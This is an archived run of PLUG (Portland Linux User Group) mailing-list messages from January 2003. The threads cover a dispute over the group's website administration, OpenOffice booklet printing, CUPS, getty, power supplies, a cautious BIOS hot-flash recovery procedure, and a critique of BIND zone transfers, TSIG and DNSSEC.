On Wed, 2003-01-08 at 09:43, Matt King wrote:
> 1.  Move the server out of control of the current admin
> Either by restricting (or removing) access to the server, or by just
> deeming another server to be the PLUG server altogether.

So the rabble rousers have managed to convince you that I am some sort
of rouge administrator?  That was what they attempted, and apparently
several of you believe it to be the case.  It is simply not true.  If
you question my ability as a systems administrator, I invite you to ask
for a login account on that machine, so you can look around and see how
it is configured and maintained.  I believe you will find everything in
good working order and ship-shape.  I've been working on Linux systems
since 1994.  I know my way around.  This ain't my first rodeo, Cowboys.

I'm NOT going to resign my duties as the PLUG server's administrator. 
This email is to provide rationale for my actions, so everyone please
read it, and don't hit reply until you've read it all (some of you need
to read it twice first).  I've not done anything wrong.  I simply did my
job.  The old site was not moving forward.  When I went in to see what I
could do to add some content, I saw an amateurish mess of PHP and what
looked like hand-typed non-validating markup with poor formatting and
lots of syntactical errors in the markup.  It was a total blotch. 
Anybody with a web browser who knows anything at all about writing web
sites could "view source" from their "Edit" menu and see it.  That
reflects on us all, as a group, does it not?

The site URL's had oddball query strings attached to them in order to
access sub pages, rather than "directory" style URL's.  The URL's where
hard to remember and looked like the usual amateur PHP nonsense.  IMO,
query strings are designed for passing parameters to pages or scripts
that return variable content, such as search engines, not for access to
sub content.  It was driven by an experimental (exploratory code) engine
written in PHP, and every sub page was accessed via "index.php?mumble".

The layout was done using nested tables with gif's in some cells to make
a border around the content.  It looked like a porn site rip off, IMO. 
Potentially one of the main problems with that design, I am given to
understand, is that it presents barriers to accessibility to the
visually handicapped.  A table free design is much easier for an aural
browser to parse and navigate.  That was a large force behind the
impetus to move HTML away from the table in a table layouting, I gather.

The site was not, as far as I can tell, well designed for easy drop-in
of new content, such as news items or meeting agenda announcements.  The
consultants listing was a static page edittable only by the "Content
Editor".  My own listing was conspicuously absent from that list!  (As
was any mention of Debian GNU/Linux, a major distro with LOTS of
contributions in use by all distros).  I certainly fixed THAT "feature"
in short order!  And I will do so without removing anyone else's
listing.  I will implement a system where each consultant may edit their
own listing's meta data at will.  They may also have an @pdxlinux.org
email address now, as well as a people.pdxlinux.org/~loginid web site. 
That did not exist before I became the system administrator (aka
"root").

Note that the person who believe I had put my resume at the top of the
site was mistaken.  My resume is at the top of
http://people.pdxlinux.org/~karlheg, not at the top of
http://www.pdxlinux.org/ as he had so graciously insinuated. ;)

The DNS is presently still somewhat broken; there have been several
sunday morning breakdowns that I had no way to fix myself.  I had to
wait until Monday morning for someone else to fix it.  In the meantime,
the lists broke.  Here's my solution proposal:

https://bugs.pdxlinux.org/mantis/view_bug_advanced_page.php?f_id=0000018
 We can discuss that bug on it's thread in "plug-web".

We had someone acting as backup DNS for the domain, but that person had
difficulty getting his end of the setup configured.  I emailed the
configuration snippet that was required at his end, but somehow it never
worked right.  I am very certain that it was a correct configuration, as
sent, because I compared it carefully with one that I know was working. 
It's really not all that complicated, once you've read the DNS book (The
O'Reilly "Cricket" book) and experimented with it a little bit.  The
stealth master link between drizzle.pdxlinux.org and ns.netule.net works
just fine, for instance.  I don't have access to all of the nameserver's
involved, and cannot even begin to troubleshoot.

It would be nice to set up an LDAP server with PLUG contact information
available.  Doing so would be a good learning experience for those
involved.

It had been decided at the PLUG web group meeting that I would work on a
new website backend.  I went to work on that right away.  I did not work
full time on it, but did manage to make some progress between other
projects.  I also had to do quite a lot of reading and thinking over of
how it would be used by a "Content Editor" -- what procedures they would
need to follow, in order to edit and create content.  I immediatly
dropped the idea of a database driven design in favor of one that uses
plain files in a filesystem.  They are so much more accessible!

John Hampton posted a layout design mockup, and I had thought that
everyone agreed that it was likeable enough to use, so I went ahead and
used it for the Mason "autohandler" template.  The overall look of the
entire site can be changed simply by changing the autohandler template
and the CSS stylesheets.  Redesign mockups may be posted to a URL and
that URL submitted to the plug-web list for review, and maybe we'll pick
another layout.  I want a table-free design that works well in all
browsers, even ones for the blind.  His initial design used nested
tables, and I've removed them in favor of stacked "div"'s.

Last week I decided to give PLUG a holiday gift, of the new website, and
then moved new.pdxlinux.org to www.pdxlinux.org in the httpd.conf, and
brought the new stuff online.  I was convinced that I had done the right
thing, and that people would either not even notice or be pleasantly
surprised when they noticed the changed sheets.  I was hoping that by
doing so before it was content-complete I would get plenty of response,
something that had not happened before when I would post to the list
about it.  Earlier, when it was still at the staging location, I had
gotten almost zero feedback, and now I've got a little (and a lot of OT
flak).

If you look right now, you'll find that much of the old site content is
in place.  It took a total of 2 hours work to port that much of it.  I
will work on it more as time permits.  I am a full time college student
and plan to make straight A's.  My coursework must take precedence, but
I will still have time for finishing the code parts of the PLUG site.  I
will implement that consultant's listing, and I will finish up my search
engine work.  (It's a masterpeice!  Look at my code!  I was very pleased
with myself for having "reinvented" ;-) that design pattern.)

> 2.  Create a separate User Group
> People who are not happy with this list and/or group can start their own
> user group.  They can organize their own separate meetings, web site,
> mailing list, etc.

Yes.  Did you catch my posting concerning a possible name for such an
"organization"?  :-)

> 3.  Do not participate in the list/group
> People who are not happy with this list and/or group can participate in
> another User Group that already exists

They sure can.  Thank you for your opinions on this matter.

> This is just silly.

Openoffice is more of a Desktop Publishing System.  People with
experience with Frame Maker, or Page Maker often have an easier time
with the difference of oo and MS Word.  To some extent everything in OO
is a frame.

From rsteff at attbi.com  Thu Jan  9 09:10:02 2003

References: <Pine.LNX.4.44.0301081812290.9489-100000@appl-ecosys.com>

Message-ID: <3E1DAC8F.BDDE0E8A@attbi.com>

Zot O'Connor wrote:

> Openoffice is more of a Desktop Publishing System.  People with
> experience with Frame Maker, or Page Maker often have an easier time
> with the difference of oo and MS Word.  To some extent everything in OO
> is a frame.

I've only had time for a brief look at OO, so what I want may be in
there and I just haven't found out what they call it.

I Word Perfect 8, there is a feature where one may divide a landscape
mode 8-1/2 x 11 page in two to get 5-1/2 x 8-1/2 pages on the same
sheet. One may then, when two sided  printing, "Print as booklet" and WP
will send the pages in the right order for folding into a booklet. In
other words, if you have an eight page document, you print odd pages
first and get page 1 and 8 on one sheet, page 3 and 6 on the next. Turn
them over and get pages 2 and 7 on the back of 1 and 8, and 4 and 5 on
the back of 3 and 6. When you stack them, and fold them down the center,
you get the booklet with the pages in order, 1 through 8.

Do you know if OO has a similar feature, and if so, what it's called?

From rshepard at appl-ecosys.com  Thu Jan  9 09:47:02 2003
From: rshepard at appl-ecosys.com (Rich Shepard)
Date: Thu Jan  9 09:47:02 2003
Subject: [PLUG] Processing words with OO
Message-ID: <Pine.LNX.4.44.0301090939570.12539-100000@appl-ecosys.com>

  Dick Steffens asked if OO could do the same brochure calculations and
layout as WordPerfect. The anwer is "yes"; from the Print menu. From the
help menu ("brochures"):

"Brochure

"Mark this option to print your document in brochure format. This occurs as
follows:

"If you print a document in portrait on a landscape page, two opposing sides
in a brochure will be printed next to each other. If you have a printer with
double-sided printing capability, then you can create an entire brochure
from your document without have to collate the pages later. If you have a
printer that only has single-sided printing capability, then you can achieve
this effect by first printing out all the fronts with theRight pages option
marked, then re-inserting the entire paper stack in your printer and
printing all the backs with the Left pages option marked. All you have to do
here is pay attention to the direction in which your printer prints."

  PLUG at work as it's supposed to operate.

Rich

From aschlemm at attbi.com  Thu Jan  9 12:06:04 2003
From: aschlemm at attbi.com (Anthony Schlemmer)
Date: Thu Jan  9 12:06:04 2003
Subject: [PLUG] CUPS and printing to a remote server
In-Reply-To: <Pine.LNX.4.44.0301082232360.32502-100000@shell1.aracnet.com>
References: <Pine.LNX.4.44.0301082232360.32502-100000@shell1.aracnet.com>
Message-ID: <200301091204.31002.aschlemm@attbi.com>

Does the remote server do any sort of smart print filtering? I tried 
using CUPS and it worked beautifully for my locally connected injet 
printer. When I need a laser printer I have to use a remote printer 
that is connected to an OpenBSD server that runs "apsfilter" that does 
some sort of smart filtering based upon the print data received. For 
some reason the remote printer prints out huge top margins on the pages 
when I use CUPS to send postscript output to the remote printer. For 
this reason I had to remove CUPS and use LPRng instead.

I think I would have been OK with CUPS if I could have figured out how 
to get it pass the print data to the remote system without it 
performing any local filtering first but this doesn't seem to be the 
way CUPS works. With LPRng I just have a forwarding queue that does no 
local filtering and the OpenBSD print server works fine with this setup 
as it handles the raw Postscript output from all of my Linux programs 
with no problems.

Tony

Giving the technical nature of this message and relevance
to Linux, I'm hoping you don't consider this spam.

My company is offering a one-day DNS training class. It's
unique in that it covers BIND and Tinydns equally. In the
past we focused on BIND and included only an introduction
to Tinydns. We now see Tinydns being deployed by large
organizations who see it as a way to increase security
and performance while eliminating the need to upgrade their
DNS software every few months to avoid attack. Therefore,
our course treats Tinydns as one of the mainstream DNS
servers.

The course covers Windows DNS as well but it gets less
coverage.

in Tigard. Details are here:

PLUG members will get the same discount as PANUG and
BizNix members.

From raanders at acm.org  Thu Jan  9 14:50:03 2003
From: raanders at acm.org (Roderick A. Anderson)
Date: Thu Jan  9 14:50:03 2003
Subject: [PLUG] Getty Question
In-Reply-To: <3E1DF776.2040901@onlinemac.com>
Message-ID: <Pine.LNX.4.33.0301091442410.7274-100000@main.cyber-office.net>

On Thu, 9 Jan 2003, Piet van Weel wrote:

> Ok.. for some reason I'm drawing a blank on this...
> 
> I've got getty spewing lines of garbage every 5 minutes or so...
> 
> 1. How do I disable it?

Depending on your distribution it may vary but those based on SysV
(Redhat, SuSE, Mandrake, ...) getty is controlled from lines in
/etc/inittab.
   Find the _*offending*_ line(s) with getty in them and comment them out.  
Danger Will Robison.  getty my be controlling your virtual terminals and 
if you disable them all you could prevent yourself from logging on.

After commenting those you are brave enough to ... restart (?) init by 
typing
	telinit Q

A better idea would be to determine why you're getting those messages and 
then fixing the problem if possible.


Good luck,
Rod
-- 
  "Open Source Software - Sometimes you get more than you paid for..."

   Boucher Bill Reintroduced

   The Boucher Bill:
   http://www.infoworld.com/articles/hn/xml/03/01/08/030108hncopying.xml?
   s=IDGNS to reform the DMCA has been reintroduced in the new session of
   Congress. The bill would re-legalize fair use copying, even if the
   user has to get around a copy-restriction system to do it. Time to
   fire off a letter to get your member of Congress to join as a
   co-sponsor.

   Remember, you can't reform all of politics at once. You can't testify
   before the Senate (and you probably can't get a meeting with your
   Senator). So you can't beat Jack Valenti on his own terms. But you can
   get letters in your Representative's face, you can meet with your
   Representative in person, and you can persuade that one person to
   sponsor that one reform.

   That's the important lesson of the "free Dmitry" movement: pick a
   small injustice that you understand and fix it. Learn. Then tackle the
   next one.

   It's called "fair use" for a reason. People, like the Elcomsoft jury,
   think it's fair. Advocating for fairness--how hard can that be? Go to
   those constituent meetings, people.

Cooper,

  Take a look at the February Linux Journal. There's a really interesting
article on ILS (Integrated Library Software) that started in New Zealand and
has defined the Earth's rotation to move east to the US. Similar to the
K12-linux effort, this one focuses on school libraries, small regional
libraries and others that cannot afford the $20,000+ for proprietary
software or have better use for the money.

  It might be something libraries outside Multnomah County might consider.
 
> Finally, on a semi-related note, Meryll Lynch spilled the beans on their
> use of Linux this morning. It's seems now that cutting costs is a
> "really hip thing to do these days" and these guys are returning value
> to their shareholders in spades! They've been kind of hinting at this
> but they absolutely went all out here:

  The same Linux Journal issue also has a fascinating article on replacing
Microsoft Exchange. They did it on the IBM z/series big iron, but it can now
be done on any server. If companies have used a lack of linux equivalent to
Exchange as a reason to not switch, they have now lost that excuse.

  What is interesting -- but not surprising -- is that the linux version
scales much higher than does the Microsoft offering.

  Both articles are certainly worth reading, especially for you folks in the
It's Technical! (IT) industry.

Rich

need.  From the File->Save As menu I see that Template is an option,

to import styles from document to document.

> One other thought I had was that maybe we should set up an OpenOffice.org

  This is a _really_ good idea, but let's take it one step beyond OO.

  A large amount of traffic on this mail list relates to system/network
setup and administration. That's quite reasonable because 1) that's where
most of us need help from time to time and B) that's what most denizens of
the list do for a living (when working, of course). But, there's more to
linux than the kernel and the GNU utiliities: the end-user applications.

  We do ask and answer questions on all sorts of apps, and I don't think
that we need a separate mail list for them. But, I think it would be a great
idea to feature this help on the Web site. We might list the applications in
which one or more of us has expertise and, perhaps, encourage questions on
them.

  Of the many mail lists to which I subscribe out of interest and need, the
OpenOffice users list is joined only when I have a question for them. Then I
unsubscribe. I do this because it has a huge amount of traffic and far too
much -- for _me_ -- is Microsoft related. So I pop on and off that list.
But, the end user application support here has been outstanding and I'd
support making it a more prominent feature of what we do.

Rich




From aschlemm at attbi.com  Fri Jan 10 11:15:03 2003
From: aschlemm at attbi.com (Anthony Schlemmer)
Date: Fri Jan 10 11:15:03 2003
Subject: [PLUG] Shutdown won't power down
In-Reply-To: <20030110180221.434CD464B@joseph.doink.com>
References: <20030110180221.434CD464B@joseph.doink.com>
Message-ID: <200301101113.54816.aschlemm@attbi.com>

To my knowledge it's not possible to get systems that use AT power 
supplies to power down unless the motherboard has some way to cut off 
the power coming from the power supply. The power switch on AT power 
supplies is connected directly to the power supply which is different 
than what ATX power supplies which use an electronic on/off in which 
the mobo can turn off the system via power management features.

You can see this with an ATX as if the power goes out it's possible to 
specify what the system should do when power is restored in the CMOS 
settings. I have my ATX systems set to stay off when the power comes 
back on. You can't do this with an AT power supply because as long as 
the power switch is in the closed position the system will power up 
when power is restored.

I have one system that still uses an AT power supply and I have to do 
special things when the power goes out to get the UPS that is connected 
to it to power down the system. If I don't do this my UPS's battery 
will be severely drained since the system will continue to run even 
though the operating system has already been halted. Draining the UPS 
battery below a certain point isn't a good thing to do since it can 
reduce the life of the battery.

An ATX power supply will continue to feed power to the mobo even when 
the system is turned off. I know most of my mobos have a red LED that 
is illuminated to indicate power is still being supplied to the mobo 
even when the system isn't powered on and running. This is why ATX 
power supplies also have an external switch on them so you can you can 
turn off the power completely to the mobo if you have to.

Tony

From m at netpro.to  Fri Jan 10 12:36:02 2003
From: m at netpro.to (Matt Alexander)
Date: Fri Jan 10 12:36:02 2003
Subject: [PLUG] Matt's tip of the day
Message-ID: <Pine.GSO.4.33.0301101239160.4596-100000@lukem.com>

Offer to train your coworkers on Linux.  Have weekly or bi-weekly classes.
Start with the GUI (substitute your "GUI" of choice), web browsing, email,
office suites, etc.  Then for those that want to learn more, gradually
teach them more about system administration and configuring services, such
as Apache, Samba, Postfix (or whatever MTA you prefer), etc.

You'll increase your knowledge by preparing for the classes as well as
from the questions you'll receive along the way.  You'll also break down
barriers to deploying Linux in your organization because people will be
more familiar with it.

Everybody wins.

require assitance.  I'll walk you through it in a shared "screen"
session (no root access required; just group "src", IIRC.)

The kernel for that box needs to be patched or it won't boot there!

volume manager and filesystems in use.  The patche packages are all
installed, and kept current.  Let me know via direct mail if you require
assistance or advice.





From cooper at linux-enterprise.net  Fri Jan 10 19:49:01 2003
From: cooper at linux-enterprise.net (Cooper Stevenson)
Date: Fri Jan 10 19:49:01 2003
Subject: [PLUG] Help!!!  PC won't boot to flash bios
In-Reply-To: <1042256329.1015.8.camel@Balrog.jimwebb.net>
References: <1042256329.1015.8.camel@Balrog.jimwebb.net>
Message-ID: <1042257524.1667.71.camel@sparticus.coopnkass.com>

Jim,

If you are certain that the BIOS is not accessing the devices correctly
because of a problem with the BIOS's logic (i.e. there are no cable
issues, etc.) then there still is a way out.

CAUTION: What I am about to show you is an _extremely_ sensitive
operation and could render a motherboard useless. PROCEED WITH EXTREME
CAUTION AND MAKE SURE TO WEAR STATIC PROTECTION

1) Boot a working machine that is not particularly vital to your
operations with the BIOS flash disk (having the original BIOS version
code; there's no sense re-burning to the new version until at the very
least things are squared away).

2) While the machine is running, pull the BIOS chip from the motherboard
with a pair of chip-puller tongs. Again I cannot stress enough how
careful you must be doing this; if you bend the motherboard or ground
out one of the contacts you will destroy it.

3) Put the BIOS chip from the new machine in the motherboard, noting
it's orientation. There will be a small half-circle notch on one of the
edges that will match a notch drawn on the motherboard. BE VERY CAREFUL
NOT TO STRESS THE MOTHERBOARD OR BEND THE PINS

4) Select "flash" from the still-running flash application you ran from
the floppy

5) After the application has flashed, exit the application and
completely shut down the machine

6) Put the newly-flashed chip in the new computer and boot

This should boot your computer to the original flash BIOS code. 

Good Luck.


-Cooper

On Fri, 2003-01-10 at 19:38, Jim Webb wrote:
> Help!!!!!!!  I just built a box with an ASUS A7V333MB, AthlonXP 2400+
> CPU, 512 MB pc 2700 RAM, Maxtor 40 GB HDD, AGP GeForce 4 video (Jaton). 
> After I originally built it several days ago, I noticed that the bios
> wasn't listing my cpu speed correctly.  Tech support suggested as well
> as Asus that I flash the bios to the latest and greatest.  I just
> flashed the bios with aflash and updated the bios from 11 version to 15
> version.  After I shut off the power I invoked the default settings, hit
> F10 for my award bios and restarted the pc.  I changed the settings for
> the bios to the ones that I wanted and saved again.  It wouldn't boot up
> after that.  Something about system error and insert a system disc and
> hit enter.  I realized that I was in some trouble here and tried to
> flash the bios to the original one, but I could not boot up to the
> floppy even I placed that at the head of the list for bootup devices.
> 
> Help somebody!!!

Alright! 

> 
> What an adrenalin rush.

Yeah, been there! Another good one is 'rm -rf' on a production server.
That'll do it too. Solution: 'cp -R' from your NFS backup and after
having made sure everything is okay, wash your flush-red face with cool
water. 

And never do it again (hint: find / -type d -name directory_to_delete
-ok {} \; ).

> 
> Do you think that I should reflash the bios piecemeal or stepwise from
> version 11 to 15 and stop whenever it works and I can get my pc to both
> recognize the cpu correctly, which it did after I flashed the bios to
> version 15, and then be able to bootup?

I would. Given this experience might I suggest running out to their web
sight and seeing if the new versions will buy you anything. A lot of
times you'll find $version_one_up_from_the_one_you_have contains a fix
for the CPU reporting issue. Sometimes, though, the fixes listed for
each version have little bearing on your situation. It's not likely you
would need an update that fixes an issue with an Adaptec MegaRAID
controller, for example.

If one were paranoid on this, one does not need the potential for DRM
additions added to the new BIOS versions as a "feature." I seriously
doubt it in this case but reports I am hearing indicate that AMI has
basically said, "we'll give you DRM weather you like it or not" for
their latest BIOS releases.


-Cooper

From aschlemm at attbi.com  Fri Jan 10 20:25:02 2003
From: aschlemm at attbi.com (Anthony Schlemmer)
Date: Fri Jan 10 20:25:02 2003
Subject: [PLUG] Shutdown won't power down
In-Reply-To: <1042256135.22770.62.camel@bittersweet.hegbloom.net>
References: <20030110180221.434CD464B@joseph.doink.com> <200301101113.54816.aschlemm@attbi.com> <1042256135.22770.62.camel@bittersweet.hegbloom.net>
Message-ID: <200301102023.34707.aschlemm@attbi.com>

I didn't care for the way "apcupsd" worked in some ways and so I'm using 
the "backupsd" monitoring daemon from the Linux UPS-HOWTO. It also has 
the ability to do a "killpower" to the UPS although the one in the 
documentation didn't work properly without some changes so I maintain 
my own version of the daemon locally now. 

I also had a a couple of BSD systems that I tried to use "apcupsd" on 
and was also displeased with it and so I ported my "backupsd" to BSD 
with some changes to take into account the differences between Linux's 
System V style init setup and the BSD-style of init. I was amazed how 
much of the coded ported right over to BSD though.

Tony

> > On Fri, 2003-01-10 at 22:58, Cooper Stevenson wrote:
> > > Jim,
> > > 
> > > If you are certain that the BIOS is not accessing the devices correctly
> > > because of a problem with the BIOS's logic (i.e. there are no cable
> > > issues, etc.) then there still is a way out.
> > > 
> > > CAUTION: What I am about to show you is an _extremely_ sensitive
> > > operation and could render a motherboard useless. PROCEED WITH EXTREME
> > > CAUTION AND MAKE SURE TO WEAR STATIC PROTECTION
> > > 
> > > 1) Boot a working machine that is not particularly vital to your
> > > operations with the BIOS flash disk (having the original BIOS version
> > > code; there's no sense re-burning to the new version until at the very
> > > least things are squared away).
> > > 
> > > 2) While the machine is running, pull the BIOS chip from the motherboard
> > > with a pair of chip-puller tongs. Again I cannot stress enough how
> > > careful you must be doing this; if you bend the motherboard or ground
> > > out one of the contacts you will destroy it.
> > > 
> > > 3) Put the BIOS chip from the new machine in the motherboard, noting
> > > it's orientation. There will be a small half-circle notch on one of the
> > > edges that will match a notch drawn on the motherboard. BE VERY CAREFUL
> > > NOT TO STRESS THE MOTHERBOARD OR BEND THE PINS
> > > 
> > > 4) Select "flash" from the still-running flash application you ran from
> > > the floppy
> > > 
> > > 5) After the application has flashed, exit the application and
> > > completely shut down the machine
> > > 
> > > 6) Put the newly-flashed chip in the new computer and boot
> > > 
> > > This should boot your computer to the original flash BIOS code. 
> > > 
> > > Good Luck.
> > > 
> > > 
> > > -Cooper

On Fri, 2003-01-10 at 20:33, Jim Webb wrote:
[snip]

> What about updating the boot block area
Modern motherboards based on Award BIOS have a boot-block BIOS. This is
small area of the BIOS that doesn't get overwritten when you flash a
BIOS. The boot-block BIOS enables recovery of a corrupted BIOS, and only
has support for the floppy drive.

> What about clear ESCD/DMI?

I don't know.

From ed at alcpress.com  Fri Jan 10 21:10:02 2003
From: ed at alcpress.com (Ed Sawicki)
Date: Fri Jan 10 21:10:02 2003
Subject: [PLUG] Re: [PLUG-WEB] [PLUG Website 0000018]: DNS
	configuration is not up to par
In-Reply-To: <200301101827.36123.pluglist@bratgrrl.com>
References: <E18WX6W-0007Q1-00@drizzle.pdxlinux.org>
	 <20030111004940.GH11269@subtend.net> <1042247786.1297.99.camel@red>
	 <200301101827.36123.pluglist@bratgrrl.com>
Message-ID: <1042261754.1297.196.camel@red>

On Fri, 2003-01-10 at 18:27, Carla Schroder wrote:
> So what's this mean in the real world? My cranky DNS guru, who uses djbdns, 
> likes to rant about what a horrid hack TSIG is, and he doesn't think much of 
> DNSSEC either. Are they necessary for DNS to work, or are they lame BIND 
> hacks, as the aforementioned cranky guru says?

Hi Carla,

Is the cranky DNS guru me or someone else you know?
I do get cranky at times - and when I do I write a
book. :-) Here's one:

No, TSIG and DNSSEC are not necessary for DNS to work.
Tens of thousands of DNS servers in the world are
running without them. But are they BIND hacks? Well,
that's a great question. The answer is a difficult
one because the DNS world is quite political and
controversial.

TSIG, DNSSEC. NOTIFY, IXFR, and other DNS-related
features are IETF efforts. Many of the people on the
IETF committees have relationships with the people
and companies that have an interest in BIND doing well. 
Some think that the committees make decisions that
ensure the popularity of BIND at the expense of better
software.

Critics of BIND, including the creator of djbdns, Dan
Bernstein - the king of cranky DNS gurus - are critical
of BIND's design. There are numerous reasons why djbdns
enthusiasts think that there's the BIND way and the
right way.

Lets take zone transfers as an example, since I recall
this being the root of the issue with PLUG's decision
to abandon it's non-BIND 9 secondary. A secondary DNS
server needs to stay synchronized with its master so it
gives out the same information (records) as the master.
It does this by asking the primary (master) for a new
copy of the zone file. The master sends the zone file
and the two are synchronized.

Zone files are plain text files, so it doesn't take
much sophistication to move them between computers.
There's no shortage of file transfer protocols. Yet,
BIND uses a file transfer protocol that is unique to
it - and unique to DNS since it was specified in an
IETF RFC. The protocol uses a silly serial number
mechanism to ensure that file transfers only occur
when the master's zone file has changed. Whoever
designed this should be bitch-slapped. Even
experienced DNS administrators update their zone files
but forget to advance the serial number and wonder why
the secondaries are giving out outdated/wrong information.

Normally, secondaries ask the masters if zone files
have changed at fixed intervals, say once an hour.
If the administrator changes a zone file, it could take
up to 59 minutes and 59 seconds for the secondary to
synchronize to the master's zone. During that time, the
secondary will be giving out old/wrong information. So,
the BIND folks created yet another mechanism specific
to BIND and DNS called NOTIFY. When the administrator
reloads a zone on the master, a message is sent to the
secondary telling it "Something has happened here. Try
to guess what it was." The secondary then contacts the
master and discovers it must do a zone transfer.

If zone files are large, such as on the root or gtld
servers, you don't want to move entire files when only
a tiny percentage of the zone file has changed. So the
BIND folks developed yet another BIND-specific protocol
called IXFR, which only moves the changes.

Since BIND has been successfully attacked for years,
the BIND folks need some way to reduce the perception
that BIND (and DNS) is insecure. So, they create yet more
BIND-specific mechanisms to try to improve security. TSIG
and DNSSEC are two of them.

The djbdns folks think it's silly to use these BIND-specific
mechanisms when we already have excellent general purpose
protocols and software to do these things. If you want to
move zone files between computers and they might be large,
you can use rsync, which only moves changes. If you're
concerned that these file transfers should be secure, run
rsync on top of SSL. If you want to be sure you're sending
a zone file to a legitimate secondary and you're not being
spoofed, configure your firewall and, optionally, use
certificates.

BIND zone transfers are backward. They're secondary pull
instead of master push. NOTIFY is a band aid to fix this
ass-backward behavior. With djbdns, administrators are
told to simply push the updated zone file to the secondary
using whatever protocols/software does the job:

rsync
rsync over SSL
scp
cp over a VPN
whatever...

Using these simpler protocols, BIND's silly serial numbers
go away. For a good laugh, read the details of BIND serial
number arithmetic and how you can convince a BIND secondary
to start using a new serial number.

Eliminate BIND and you don't have to worry about drilling a
TCP/53 hole in your firewall to allow zone transfers. Things
get simpler without the BIND nonsense. There are other issues,
such as cache poisoning, that are greatly reduced with common
sense design and implementation.

We don't need no steenking TSIG.

-- 
Ed Sawicki <ed at alcpress.com>
ALC

From cooper at linux-enterprise.net  Fri Jan 10 22:18:02 2003
From: cooper at linux-enterprise.net (Cooper Stevenson)
Date: Fri Jan 10 22:18:02 2003
Subject: [PLUG] Rationale for my actions: I am not a "rogue admin".
In-Reply-To: <1042264883.1783.235.camel@red>
References: <Pine.LNX.4.21.0301090309530.17742-100000@shaft.bitmine.net>
	<1042254071.22770.46.camel@bittersweet.hegbloom.net> 
	<1042264883.1783.235.camel@red>
Message-ID: <1042266427.1667.111.camel@sparticus.coopnkass.com>

And this...

Ok, I'm running the following config
--
M$ Win2k SP3, VIA AGP 4.20a, DirectX 8.1b,
DetonatorXP 30.82, Promise FastTrak 2.00.0.24 (w/ HD Reset Fix)
AMD AthlonXP 2000+ 1.67GHz (266MHz FSB) (IN JUMPER-FREE)
ASUS A7V133 rev 1.04, ICS 94215AF, EXPERT BIOS 1009 (w/o 48-bit LBA)
Crucial 512MB (2x256MB) PC133 CL2 SDRAM
ASUS V8200 T2 Deluxe (NVIDIA GeForce3 Ti-200)
Creative Labs SoundBlaster Audigy X-Gamer
Intel Pro/100B Ethernet Card
Maxtor 45GB 7200RPM ATA/100 (54610H6) on VIA Primary
Maxtor 80GB 7200RPM ATA/133 FDB (6L080L4) on Promise RAID1
Maxtor 80GB 7200RPM ATA/133 FDB (6L080L4) on Promise RAID1
Toshiba 16x DVD-ROM (SD-M1612) on VIA Secondary
Plextor PlexWriter 12/10/32A (PX-W1210A) on VIA Secondary
--

The keys to having a "good" chance if your board will support an
AthlonXP are the following:

1) BIOS.  Update to BIOS 1009 (Official) or 1010.01A (Beta)
2) Board revision.  (Use http://babelfish.altavista.com to translate)
http://www.asuscom.de/support/techmain/FAQ/amd_mb/faq085b_CPU_Upgrade_II.htm
3) Clock generator chip next to your memory slots.  ICS 94215AF is a
must.
4) Good quality memory.  If you have problems booting, try changing your
VIO to 3.3v from the default of 3.45v.

Good luck!
Tuan

> Crucial 512MB (2x256MB) PC133 CL2 SDRAM
> ASUS V8200 T2 Deluxe (NVIDIA GeForce3 Ti-200)
> Creative Labs SoundBlaster Audigy X-Gamer
> Intel Pro/100B Ethernet Card
> Maxtor 45GB 7200RPM ATA/100 (54610H6) on VIA Primary
> Maxtor 80GB 7200RPM ATA/133 FDB (6L080L4) on Promise RAID1
> Maxtor 80GB 7200RPM ATA/133 FDB (6L080L4) on Promise RAID1
> Toshiba 16x DVD-ROM (SD-M1612) on VIA Secondary
> Plextor PlexWriter 12/10/32A (PX-W1210A) on VIA Secondary
> --
> 
> The keys to having a "good" chance if your board will support an
> AthlonXP are the following:
> 
> 1) BIOS.  Update to BIOS 1009 (Official) or 1010.01A (Beta)
> 2) Board revision.  (Use http://babelfish.altavista.com to translate)
> http://www.asuscom.de/support/techmain/FAQ/amd_mb/faq085b_CPU_Upgrade_II.htm
> 3) Clock generator chip next to your memory slots.  ICS 94215AF is a
> must.
> 4) Good quality memory.  If you have problems booting, try changing your
> VIO to 3.3v from the default of 3.45v.
> 
> Good luck!
> Tuan
> 
>

drop all further talk about the website for a week. That means,
no more flames, no more responses, no more anything concerning
www.pdxlinux.org.

Things are happening with the website, although it's not yet
visible to anyone. It's slow going because Dave had to take a
few steps first, & many of the folks involved do have day jobs,
responsibilities, et cetera, which allow us only a limited amount
of time to devote to this. (Not to make any promises, but I
suspect that within a month or 4 weeks, the website will look
far different than it did not only around the New Year, but
in late December. Stay tuned for further details.)

As for certain individuals who keep dragging the subject back
onto the PLUG list, let me say this: if you don't like what someone
says, learn to filter your email. Procmail is a good choice for
those of you who run a real OS, but I think one can filter email
even with the cheap software that comes pre-loaded on many
computers. Further posts only encourage further posts, no matter
what is said, no matter how much signal or noise is in the message,
& is proving to be as useful as poking a wild animal with a pointy
stick.

Prove to me that, as usual, I'm contributing to an off-topic thread
that is dead & over, by not following up to this email.

Thanks for your co-operation.

Geoff

From ptkwt at aracnet.com  Sat Jan 11 13:20:02 2003
From: ptkwt at aracnet.com (Phil Tomson)
Date: Sat Jan 11 13:20:02 2003
Subject: [PLUG] Now they're sending the good jobs to India
In-Reply-To: <Pine.LNX.4.33.0301111211220.1598-100000@joan.burling.com>
Message-ID: <Pine.LNX.4.44.0301111308410.8961-100000@shell1.aracnet.com>

OK, this is probably off-topic, but I think we need a new topic for
discussion...

Anyone else catch this article in the Portland Tribune:
http://www.portlandtribune.com/archview.cgi?id=15744

It's an interview with a local venture capitalist.  They ask him questions
about where he thinks the Oregon economy is headed and for the most part
he's got some really good observations about how things are different this
time around since Tektronics is a shadow of what it was in the 80's and no
other company in the area now can do what they did back then...

He then gets to the central problem right now - outsourcing of engineering
jobs - and he cites this as a major impediment to economic growth here.
As an example he mentions that Mentor Graphics is investing $40million in
an R&D center in India.  When he asked Mentor why they were doing this, he
got this reply: "they can't hire anyone graduating from engineering
schools here because they're just not prepared, they're just not ready to
go into that sophisticated end of the business." Anybody else find this
statement not only disingenuous, but somewhat insulting?

Of course we know that the real reason is that they can pay Indian
engineers what amounts to minimum wage here.  Given the number of
engineers that are currently out of work (and a lot of us are going back
to school to improve our skills) they could easily staff up an R&D center
here.


Phil

From tisson.k.mathew at intel.com  Sat Jan 11 13:38:02 2003
From: tisson.k.mathew at intel.com (Mathew, Tisson K)
Date: Sat Jan 11 13:38:02 2003
Subject: [PLUG] Now they're sending the good jobs to India
Message-ID: <187D3A7CAB42A54DB61F1D05F01257220E272C@orsmsx402.jf.intel.com>

My 2 cents worth ... I think there are some very good companies/engineers in
